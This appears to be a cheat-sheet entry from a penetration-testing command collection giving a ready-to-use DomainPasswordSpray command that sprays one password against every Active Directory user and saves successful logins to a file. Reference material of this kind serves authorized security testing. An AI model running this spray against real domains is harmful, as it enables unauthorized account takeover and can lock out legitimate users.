# DomainPasswordSpray

## DomainPasswordSpray.ps1

### Password spray

Dump password spray with DomainPasswordSpray.

Spray a single password across every domain user from a domain-joined Windows host. Pulls the user list and lockout policy automatically; results saved to `spray_success`.

```sh title:"DomainPasswordSpray Dump Password Spray"
Invoke-DomainPasswordSpray -Password $pass -OutFile spray_success -ErrorAction SilentlyContinue
```
<!-- cheat
var pass
-->

